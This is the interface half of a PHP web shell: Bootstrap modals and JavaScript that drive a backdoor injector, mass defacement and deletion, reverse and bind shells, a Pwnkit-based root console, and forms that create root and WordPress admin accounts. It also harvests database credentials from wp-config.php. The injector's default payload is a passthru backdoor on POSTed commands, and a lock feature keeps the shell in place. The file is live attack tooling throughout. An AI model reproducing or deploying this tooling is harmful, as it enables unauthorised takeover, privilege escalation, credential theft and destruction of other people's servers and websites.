<div class="modal fade" id="injectModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug-fill"></i> Backdoor Injector</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="injectForm"><div class="mb-3"><label for="targetFile" class="form-label">Target PHP File:</label><select class="form-select" id="targetFile" name="file" required><option value="" selected disabled>-- Select a writable PHP file --</option><?php foreach ($files as $file) { if (pathinfo($file, PATHINFO_EXTENSION) == 'php' && is_writable($path . $file)) { echo '<option value="' . htmlspecialchars($file) . '">' . htmlspecialchars($file) . '</option>'; } } ?></select></div><div class="mb-3"><label for="backdoorCode" class="form-label">Backdoor Code to Prepend:</label><textarea class="form-control" id="backdoorCode" name="code" rows="4" required><?php echo htmlspecialchars('<?php if(isset($_POST["cmd"])) { echo "<pre>"; passthru($_POST["cmd"]); echo "</pre>"; } ?>'); ?></textarea></div><button type="submit" class="btn btn-danger w-100">Inject Backdoor</button></form></div></div></div></div>
<div class="modal fade" id="editorModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="editorFileName"></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><textarea id="editorContent" class="form-control" style="height: 60vh; font-family: 'Roboto Mono';"></textarea></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button><button type="button" class="btn btn-main" id="saveFileBtn">Save Changes</button></div></div></div></div>
<div class="modal fade" id="massDefaceModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-exclamation-diamond"></i> Mass Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="massOutput" class="output-console mb-3 d-none"></div><p>Mass Deface</p><form id="massDefaceForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><div class="mb-2"><textarea class="form-control" rows="3" name="script" placeholder="Hacked" required></textarea></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="onedir" value="onedir" checked><label class="form-check-label" for="onedir">One Dir</label></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="mass" value="mass"><label class="form-check-label" for="mass">Recursive</label></div><button type="submit" class="btn btn-main w-100 mt-2">Start Deface</button></form><hr><p class="mt-3">Mass Delete</p><form id="massDeleteForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><button type="submit" class="btn btn-danger w-100 mt-2">Start Deleting</button></form></div></div></div></div>
<div class="modal fade" id="networkModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-hdd-network"></i> Network Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="networkOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-tab" role="tablist"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-bind">Bind Port</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-back">Back-Connect</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-bind"><form class="network-form"><h6>Bind Port to /bin/sh [Perl]</h6><div class="input-group"><input class="form-control" type="text" name="port" placeholder="6969" required><button class="btn btn-main" type="submit" name="bpl">Execute</button></div></form></div><div class="tab-pane fade" id="nav-back"><form class="network-form"><h6>Back-Connect</h6><div class="mb-2"><label class="form-label">Server IP:</label><input class="form-control" type="text" name="server" value="<?php echo ia(); ?>" required></div><div class="mb-2"><label class="form-label">Port:</label><input class="form-control" type="text" name="port" placeholder="6969" required></div><div class="input-group"><select class="form-select" name="bc"><option value="perl">Perl</option><option value="python">Python</option></select><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div></div></div>

<div class="modal fade" id="rootConsoleModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-terminal-plus"></i> Root Console</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="pwnkitStatus" class="alert alert-secondary">Checking Pwnkit status...</div><div id="rootCmdOutput" class="output-console mb-3"># Output will appear here...</div><form id="rootCmdForm"><div class="input-group"><span class="input-group-text" id="promptIndicator">#</span><input type="text" class="form-control" id="rootCmdInput" placeholder="id" required><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div>
<div class="modal fade" id="securityModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-shield-lock"></i> Security Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="securityOutput" class="output-console mb-3 d-none"></div><h6 class="text-white-50">Backdoor Destroyer</h6><p><small>This will overwrite the <code>.htaccess</code> file in the document root to block access to all PHP files except this shell and common CMS files. Use with caution.</small></p><button class="btn btn-danger w-100 mb-4" id="destroyerBtn">Activate Backdoor Destroyer</button><hr><h6 class="text-white-50">Lock File / Shell</h6><p><small>Creates a background process to ensure a file remains locked (read-only) and is restored if deleted.</small></p><form id="lockItemForm"><div class="input-group"><input type="text" class="form-control" name="file_to_lock" placeholder="filename.php (in current dir)" required><button class="btn btn-main" type="submit">Lock Item</button></div></form></div></div></div></div>
<div class="modal fade" id="usersModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-people-fill"></i> User Management</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="usersOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-user-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-root-user">Root User</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-wp-user">WordPress User</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-root-user"><p><small>Add a new root user to the system. Requires a vulnerable server (check with Root Console).</small></p><form id="addRootUserForm"><div class="mb-2"><label class="form-label">Username</label><input type="text" name="username" class="form-control" required></div><div class="mb-2"><label class="form-label">Password</label><input type="text" name="password" class="form-control" required></div><button type="submit" class="btn btn-main w-100">Add Root User</button></form></div><div class="tab-pane fade" id="nav-wp-user"><p><small>Add a new administrator user to a WordPress installation.</small></p><form id="addWpUserForm"><div class="input-group mb-2"><input type="text" class="form-control" id="wpConfigPath" placeholder="Auto-detect or enter path to wp-config.php"><button class="btn btn-outline-secondary" type="button" id="parseWpConfigBtn">Parse</button></div><div class="row"><div class="col-md-6 mb-2"><input type="text" id="db_host" name="db_host" class="form-control" placeholder="DB Host" required></div><div class="col-md-6 mb-2"><input type="text" id="db_name" name="db_name" class="form-control" placeholder="DB Name" required></div><div class="col-md-6 mb-2"><input type="text" id="db_user" name="db_user" class="form-control" placeholder="DB User" required></div><div class="col-md-6 mb-2"><input type="text" id="db_pass" name="db_pass" class="form-control" placeholder="DB Password"></div><hr class="my-2"><div class="col-md-6 mb-2"><input type="text" name="wp_user" class="form-control" placeholder="New WP Username" required></div><div class="col-md-6 mb-2"><input type="text" name="wp_pass" class="form-control" placeholder="New WP Password" required></div></div><button type="submit" class="btn btn-main w-100 mt-2">Add WordPress Admin</button></form></div></div></div></div></div></div>

<div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    const currentPath = '<?php echo $path; ?>';
    const scriptUrl = '<?php echo $_SERVER['PHP_SELF']; ?>';
    let isPwnkitVulnerable = false;

    function showToast(message, type = 'success') {
        const toastId = 'toast-' + Date.now();
        const toastHTML = `<div id="${toastId}" class="toast align-items-center text-bg-${type} border-0" role="alert" aria-live="assertive" aria-atomic="true"><div class="d-flex"><div class="toast-body">${message}</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div></div>`;
        document.getElementById('toast-container').insertAdjacentHTML('beforeend', toastHTML);
        const toast = new bootstrap.Toast(document.getElementById(toastId));
        toast.show();
    }

    <?php if(isset($_SESSION['flash_message'])): ?>
        showToast('<?php echo addslashes($_SESSION['flash_message']); ?>');
        <?php unset($_SESSION['flash_message']); ?>
    <?php endif; ?>

    function ajaxRequest(data, successCallback) {
        fetch(`${scriptUrl}?ajax=true&path=${encodeURIComponent(currentPath)}`, { method: 'POST', body: data })
        .then(response => response.json()).then(successCallback)
        .catch(error => { console.error('Error:', error); showToast('An unexpected error occurred.', 'danger'); });
    }
    
    // File Manager Logic (Delete, Create, Rename, Edit)
    document.getElementById('selectAll').addEventListener('change', e => document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = e.target.checked));
    document.querySelectorAll('.file-checkbox').forEach(cb => cb.addEventListener('change', () => document.getElementById('deleteSelectedBtn').classList.toggle('d-none', !document.querySelector('.file-checkbox:checked'))));
    document.getElementById('deleteSelectedBtn').addEventListener('click', () => {
        const files = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
        if(confirm(`Delete ${files.length} item(s)?`)) {
            const fd = new FormData(); fd.append('action', 'delete_multiple'); files.forEach(f => fd.append('files[]', f));
            ajaxRequest(fd, d => { showToast(`Deleted ${d.success.length}. Failed: ${d.errors.length}.`); if(d.success.length) setTimeout(()=>location.reload(),1e3);});
        }
    });
    document.getElementById('createFileForm').addEventListener('submit',e=>{e.preventDefault(); const fd=new FormData(); fd.append('action','create_file'); fd.append('name',document.getElementById('newFileName').value); ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});});
    document.getElementById('createFolderForm').addEventListener('submit',e=>{e.preventDefault(); const fd=new FormData(); fd.append('action','create_folder'); fd.append('name',document.getElementById('newFolderName').value); ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});});
    window.renameItem=item=>{const n=prompt(`New name for "${item}":`,item);if(n&&n!==item){const fd=new FormData();fd.append('action','rename');fd.append('old',item);fd.append('new',n);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});}};
    const editorModal=new bootstrap.Modal(document.getElementById('editorModal'));let currentEditingFile='';
    window.viewItem=file=>editItem(file,true);window.editItem=(file,ro=false)=>{currentEditingFile=file;document.getElementById('editorFileName').textContent=(ro?'Viewing: ':'Editing: ')+file;const ec=document.getElementById('editorContent');ec.value='Loading...';ec.readOnly=ro;document.getElementById('saveFileBtn').style.display=ro?'none':'block';const fd=new FormData();fd.append('action','get_content');fd.append('file',file);ajaxRequest(fd,d=>{ec.value=d.status==='ok'?d.content:d.message;editorModal.show();});};
    document.getElementById('saveFileBtn').addEventListener('click',()=>{const fd=new FormData();fd.append('action','save_content');fd.append('file',currentEditingFile);fd.append('content',document.getElementById('editorContent').value);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')editorModal.hide();});});

    // Modal forms
    document.getElementById('injectForm').addEventListener('submit',e=>{e.preventDefault();if(confirm('Inject this backdoor?')){const fd=new FormData(e.target);fd.append('action','inject_backdoor');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')bootstrap.Modal.getInstance(document.getElementById('injectModal')).hide();});}});
    document.querySelectorAll('.network-form').forEach(f=>f.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('networkOutput');o.innerHTML='Executing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','network');ajaxRequest(fd,d=>o.innerText=d.output);}));
    document.getElementById('massDefaceForm').addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_deface');ajaxRequest(fd,d=>o.innerText=d.output);});
    document.getElementById('massDeleteForm').addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_delete');ajaxRequest(fd,d=>o.innerText=d.output);});
    
    // Root Console Logic
    const rootConsoleModal = document.getElementById('rootConsoleModal');
    rootConsoleModal.addEventListener('shown.bs.modal', () => {
        const statusEl = document.getElementById('pwnkitStatus');
        const promptEl = document.getElementById('promptIndicator');
        const fd = new FormData(); fd.append('action', 'check_pwnkit_status');
        ajaxRequest(fd, data => {
            isPwnkitVulnerable = data.vulnerable;
            statusEl.textContent = data.message;
            statusEl.className = `alert ${isPwnkitVulnerable ? 'alert-success' : 'alert-danger'}`;
            promptEl.textContent = isPwnkitVulnerable ? '#' : '$';
        });
    });
    document.getElementById('rootCmdForm').addEventListener('submit', e => {
        e.preventDefault();
        const cmdInput = document.getElementById('rootCmdInput');
        const cmdOutput = document.getElementById('rootCmdOutput');
        const fd = new FormData();
        fd.append('action', isPwnkitVulnerable ? 'root_cmd' : 'cmd');
        fd.append('cmd', cmdInput.value);
        const prompt = isPwnkitVulnerable ? '#' : '$';
        cmdOutput.innerHTML += `\n<span style="color:var(--primary-accent);">${prompt} ${cmdInput.value}</span>\n`;
        ajaxRequest(fd, data => {
            cmdOutput.innerHTML += data.output || 'Error';
            cmdOutput.scrollTop = cmdOutput.scrollHeight;
            cmdInput.value = '';
        });
    });

    // Security Modal Logic
    document.getElementById('destroyerBtn').addEventListener('click',e=>{e.preventDefault();if(confirm('ARE YOU SURE? This will overwrite the .htaccess file.')){const o=document.getElementById('securityOutput');o.innerText='Activating...';o.classList.remove('d-none');const fd=new FormData();fd.append('action','backdoor_destroyer');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});}});
    document.getElementById('lockItemForm').addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('securityOutput');o.innerText='Locking item...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','lock_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});});
    
    // User Management Modal Logic
    document.getElementById('addRootUserForm').addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add root user...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_root_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    document.getElementById('addWpUserForm').addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add WordPress admin...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_wp_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    document.getElementById('parseWpConfigBtn').addEventListener('click', e => {
        e.preventDefault();
        const o = document.getElementById('usersOutput');
        o.innerText = 'Searching for wp-config.php...';
        o.classList.remove('d-none');
        const fd = new FormData();
        fd.append('action', 'parse_wp_config');
        const manualPath = document.getElementById('wpConfigPath').value;
        if(manualPath) fd.append('config_path', manualPath);
        ajaxRequest(fd, d => {
            if(d.status === 'ok') {
                o.innerText = 'Successfully parsed credentials from: ' + d.path;
                document.getElementById('db_host').value = d.creds.db_host || '';
                document.getElementById('db_name').value = d.creds.db_name || '';
                document.getElementById('db_user').value = d.creds.db_user || '';
                document.getElementById('db_pass').value = d.creds.db_password || '';
            } else {
                o.innerText = d.message;
            }
        });
    });
});
</script>
</body>
</html>
